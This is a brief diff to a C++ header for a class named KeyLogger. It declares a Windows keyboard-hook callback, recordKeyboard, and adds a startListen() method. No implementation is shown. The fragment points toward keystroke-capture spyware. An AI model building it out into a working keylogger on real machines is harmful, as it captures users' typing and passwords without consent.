@@ -13,4 +13,5 @@ public:
 	~KeyLogger();
 
 	static LRESULT CALLBACK recordKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
+	void startListen();
 };
